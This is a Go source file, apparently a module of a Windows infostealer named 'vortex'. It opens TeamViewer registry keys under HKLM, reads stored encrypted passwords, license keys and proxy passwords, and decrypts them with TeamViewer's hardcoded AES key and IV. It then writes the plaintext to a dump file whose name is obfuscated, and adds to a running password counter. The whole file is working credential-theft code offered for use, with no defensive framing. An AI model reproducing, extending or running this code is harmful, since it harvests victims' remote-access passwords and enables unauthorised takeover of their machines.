//go:build windows

package softwares

import (
	"crypto/aes"
	"crypto/cipher"
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"

	"github.com/olekukonko/tablewriter"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/unicode"
)

func DecryptTeamviewerPass(encPass []byte) string {

	AESKey := []byte{
		0x06, 0x02, 0x00, 0x00,
		0x00, 0xa4, 0x00, 0x00,
		0x52, 0x53, 0x41, 0x31,
		0x00, 0x04, 0x00, 0x00}
	iv := []byte{
		0x01, 0x00, 0x01, 0x00,
		0x67, 0x24, 0x4F, 0x43,
		0x6E, 0x67, 0x62, 0xF2,
		0x5E, 0xA8, 0xD7, 0x04}

	block, err := aes.NewCipher(AESKey)
	if err != nil {
		panic(err)
	}
	mode := cipher.NewCBCDecrypter(block, iv)
	ciphertext := make([]byte, len(encPass))
	mode.CryptBlocks(ciphertext, encPass)
	decoder := unicode.UTF16(unicode.LittleEndian, unicode.UseBOM).NewDecoder()
	password, _ := decoder.String(string(ciphertext))
	return password
}

func TeamviewerDumpPass(mainFolder string) error {

	tvFile := filepath.Join(mainFolder, encrypt.B64Util("teamviewer-dump.dat", 0))

	file, err := os.Create(tvFile)
	if err != nil {
		return err
	}
	defer file.Close()

	creds := tablewriter.NewWriter(file)
	creds.SetHeader([]string{"TeamViewer Decrypted Password"})

	regPath := []string{
		"SOFTWARE\\TeamViewer\\Temp",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version7",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version8",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version9",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version10",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version11",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version12",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version13",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version14",
		"SOFTWARE\\WOW6432Node\\TeamViewer\\Version15",
		"SOFTWARE\\TeamViewer",
		"SOFTWARE\\WOW6432Node\\TeamViewer"}

	regKey := []string{
		"SecurityPasswordAES",
		"SecurityPasswordExported",
		"ServerPasswordAES",
		"ProxyPasswordAES",
		"LicenseKeyAES",
		"OptionsPasswordAES",
		"PermanentPassword"}

	for i := range regPath {
		reg, err := registry.OpenKey(registry.LOCAL_MACHINE, regPath[i], registry.QUERY_VALUE)
		defer reg.Close()
		if err == nil {
			for j := range regKey {
				encPass, _, err := reg.GetBinaryValue(regKey[j])
				if err == nil {
					creds.Append([]string{DecryptTeamviewerPass(encPass)})
				}
			}
		}
	}
	creds.Render()
	hutil.PasswordCounter += creds.NumLines()

	return nil
}
